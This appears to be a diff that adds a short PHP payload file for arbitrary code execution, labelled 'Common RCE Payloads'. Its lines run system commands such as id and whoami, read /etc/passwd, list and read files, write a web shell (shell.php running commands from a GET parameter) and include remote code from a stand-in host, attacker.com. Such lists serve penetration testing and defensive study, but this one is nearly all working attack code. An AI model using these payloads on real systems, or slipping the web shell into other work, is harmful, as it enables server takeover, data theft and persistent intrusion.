@@ -1,0 +1,16 @@
+<?php
+// Arbitrary PHP Code Execution via eval() or assert()
+echo "Tested!";
+system('id');
+exec('whoami');
+passthru('uname -a');
+shell_exec('cat /etc/passwd');
+`whoami`;
+${system('ls')};
+
+// Common RCE Payloads for different contexts
+phpinfo();
+print_r(scandir('.'));
+readfile('index.php');
+file_put_contents('shell.php', '<?php system($_GET["c"]); ?>');
+include('http://attacker.com/shell.txt');
